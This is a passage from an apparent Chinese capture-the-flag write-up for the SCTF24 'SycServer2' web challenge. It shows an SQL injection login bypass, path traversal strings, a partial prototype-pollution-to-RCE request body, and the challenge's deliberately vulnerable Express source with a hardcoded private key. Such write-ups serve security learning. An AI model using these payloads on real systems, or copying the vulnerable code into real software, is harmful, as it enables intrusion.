      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SycServer2_SCTF24</title>
      <link href="/2024/11/01/SycServer2_SCTF24/"/>
      <url>/2024/11/01/SycServer2_SCTF24/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试-Failed"><a href="#分析与尝试-Failed" class="headerlink" title="分析与尝试(Failed)"></a>分析与尝试(Failed)</h2><ol><li><p>右键查看源码发现有个sql的waf，在前端可以控制台直接覆盖掉&#x2F;修改(这里不是禁用)</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wafsql = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>都到这个点了那就sql注入，admin和1’or ‘1’&#x3D;’1 –&gt; &#x2F;robots.txt文件中的路由需要登录后访问</p></li><li><p>&#x2F;robots.txt下有信息，考虑存在目录遍历回显文件内容，<code>?v=.&amp;f=app.js</code>或者<code>?v=....//....//....//....//app&amp;f=/app.js</code>(说实话应该没必要吧)</p></li><li><p><em><strong>可以读源码</strong></em>，读出来不可读，cyberchef发发力，ok，有app.js，可知express框架，可按找架构获取一些信息(也可从app.js出发)，都放在源码处了，这里可以的话**dirsearch发发力(docker的话一般可以)**，当然要试试&#x2F;flag了，不过没什么55</p><ol><li>package.json读读看，环境相关，还是要有意识</li><li><code>const handle = require(&#39;./handle&#39;);</code>引入但是没有用，读文件也不行，猜测为文件夹，进行读取<code>handle/index.js</code></li><li>index.js内容指向，读<code>handle/child_process.js</code></li><li><code>/static/report_noway_dirsearch.html</code>是从app.js中读出来的</li></ol></li><li><p>发现一个风险函数和原型链污染</p><ol><li>有原型链污染</li><li>但是没人调用啊，输入源是command也写定了，难搞，看看别的文件</li><li>哟西，<code>/child_processes</code>会是切入口，我理理，argv0覆盖？要的话得在prototypelessObj添加属性argv0，前面不是有个原型链覆盖吗  –&gt; sad，这一步没去想查一直钻(<strong>env也是一个思路但是被我忽视了</strong>)，<strong>不会还是多查查资料</strong>，这里是属于原型链污染命令执行的内容，可以看看<strong>payload中有无形似的再了解原理</strong></li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Report Success&#x27;);window.location.href=&#x27;/report&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/VanZY_s_T3st&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> command = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> cmd = cp.<span class="title function_">spawn</span>(command ,[]);</span><br><span class="line">  cmd.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">end</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><blockquote><p>pp2rce原理部分见同名文章，但是看完还是没看懂题解啊55，欸欸欸，有点思路了<br><a href="https://xz.aliyun.com/t/15782?time__1311=GqjxnQGQDQExl6zG7DyDIOOQGCYyh3+x3x&u_atoken=e4ab7359fc825c21b8d183b69afdd937&u_asig=0a47315217305328929498942e013f#toc-4">这篇文章看思路就好了</a>，和我最后顿悟的分析一致</p></blockquote><ol><li>再次回看，直接按照spawn的输入进行思考(<strong>有个参照好很多</strong>)，注意apply里的arg包括了command，分析可知会进入<code>pos&lt;args.length</code>环节，可知pos会++，变成2</li><li>这里ai一下可以知道，如果传入的是空的比如<code>prototypelessSpawnOpts()</code>再加上后买你<code>Object.create()</code>和<code>Object.assign()</code>原型链污染被过滤的死死的，要污染到env传入的obj中env有内容，也就是需要从<code>if(hasArgs...)</code>这个if条件中进入，此时的传入为<code>args[2]</code></li><li>综上，需要args[2]是一个对象，结合原型链污染漏洞，构造1如下，后续就考虑经典的pp2rce问题即可</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造1</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;__proto__&quot;</span></span><br><span class="line">  <span class="string">&quot;date&quot;</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="comment">// 以下对象值会是传入spawn()中options的内容</span></span><br><span class="line">  <span class="string">&quot;reportmessage&quot;</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;NODE_OPTIONS&quot;</span>: <span class="comment">// ...</span></span><br><span class="line">    <span class="string">&quot;env&quot;</span>:  <span class="comment">//... </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最终payload2</span></span><br></pre></td></tr></table></figure><h2 id="新东西"><a href="#新东西" class="headerlink" title="新东西"></a>新东西</h2><ol><li>node proxy 见 Nodejs安全</li><li>pp2rce见同名文章</li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> nodeRsa = <span class="built_in">require</span>(<span class="string">&#x27;node-rsa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mysql = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> handle = <span class="built_in">require</span>(<span class="string">&#x27;./handle&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> con = mysql.<span class="title function_">createConnection</span>(&#123;</span><br><span class="line">  <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;ctf123123&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span>: <span class="string">&#x27;sctf&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">con.<span class="title function_">connect</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="property">message</span>);</span><br><span class="line">    <span class="built_in">setTimeout</span>(con.<span class="title function_">connect</span>(), <span class="number">2000</span>); <span class="comment">// 2秒后重试连接</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected to MySQL&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;response&#125; = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> req = <span class="built_in">require</span>(<span class="string">&quot;express/lib/request&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(&#123; <span class="attr">b</span>: <span class="number">1024</span> &#125;);</span><br><span class="line">key.<span class="title function_">setOptions</span>(&#123; <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> publicPem = -----<span class="variable constant_">BEGIN</span> <span class="variable constant_">PUBLIC</span> <span class="variable constant_">KEY</span>-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B<span class="comment">//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----;</span></span><br><span class="line"><span class="keyword">var</span> privatePem = <span class="string">`-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span></span><br><span class="line"><span class="string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span></span><br><span class="line"><span class="string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span></span><br><span class="line"><span class="string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span></span><br><span class="line"><span class="string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span></span><br><span class="line"><span class="string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span></span><br><span class="line"><span class="string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span></span><br><span class="line"><span class="string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span></span><br><span class="line"><span class="string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span></span><br><span class="line"><span class="string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span></span><br><span class="line"><span class="string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span></span><br><span class="line"><span class="string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span></span><br><span class="line"><span class="string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span></span><br><span class="line"><span class="string">xu/vfQ0A1jHRNC7t</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Reportcache</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verifyAdmin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> token = req.<span class="property">cookies</span>[<span class="string">&#x27;auth_token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;No token provided&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">SECRET_KEY</span>, <span class="function">(<span class="params">err, decoded</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Failed to authenticate token&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (decoded.<span class="property">role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req.<span class="property">user</span> = decoded;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>)=&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/config&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">publicKey</span>: publicPem,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> decrypt = <span class="keyword">function</span>(<span class="params">body</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> pem = privatePem;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="title function_">nodeRsa</span>(pem, &#123;</span><br><span class="line">      <span class="attr">encryptionScheme</span>: <span class="string">&#x27;pkcs1&#x27;</span>,</span><br><span class="line">      <span class="attr">b</span>: <span class="number">1024</span></span><br><span class="line">    &#125;);</span><br><span class="line">    key.<span class="title function_">setOptions</span>(&#123; <span class="attr">environment</span>: <span class="string">&quot;browser&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> key.<span class="title function_">decrypt</span>(body, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;decrypt error&quot;</span>, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> encryptedPassword = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">  <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    passwd = <span class="title function_">decrypt</span>(encryptedPassword)</span><br><span class="line">    <span class="keyword">if</span>(username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> sql = <span class="title function_">select</span> (select password <span class="keyword">from</span> user where username = <span class="string">&#x27;admin&#x27;</span>) = <span class="string">&#x27;$&#123;passwd&#125;&#x27;</span>;</span><br><span class="line">      con.<span class="title function_">query</span>(sql, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(err.<span class="property">message</span>);</span><br><span class="line">        <span class="keyword">if</span> (rows[<span class="number">0</span>][<span class="title class_">Object</span>.<span class="title function_">keys</span>(rows[<span class="number">0</span>])]) &#123;</span><br><span class="line">          <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;username, <span class="attr">role</span>: username&#125;, <span class="variable constant_">SECRET_KEY</span>, &#123;<span class="attr">expiresIn</span>: <span class="string">&#x27;1h&#x27;</span>&#125;);</span><br><span class="line">          res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, token, &#123;<span class="attr">secure</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Login Successfully&#x27;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Errow Password!&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;This Website Only Open for admin&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&#x27;Error decrypting password!&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ExP0rtApi&#x27;</span>, verifyAdmin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> rootpath = req.<span class="property">query</span>.<span class="property">v</span>;</span><br><span class="line">  <span class="keyword">var</span> file = req.<span class="property">query</span>.<span class="property">f</span>;</span><br><span class="line"></span><br><span class="line">  file = file.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  rootpath = rootpath.<span class="title function_">replace</span>(<span class="regexp">/\.\.\//g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(rootpath === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(file === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;try to find parameters HaHa&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      rootpath = <span class="string">&quot;static&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(__dirname, rootpath + <span class="string">&quot;/&quot;</span> + file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;File not found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, fileData</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading file:&#x27;</span>, err);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zlib.<span class="title function_">gzip</span>(fileData, <span class="function">(<span class="params">err, compressedData</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error compressing file:&#x27;</span>, err);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error compressing file&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">const</span> base64Data = compressedData.<span class="title function_">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">      res.<span class="title function_">send</span>(base64Data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/static/report_noway_dirsearch.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/report&quot;</span>, verifyAdmin ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;user, date, reportmessage&#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Reportcache</span>[user] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title class_">Reportcache</span>[user] = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Reportcache</span>[user][date] = reportmessage</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title 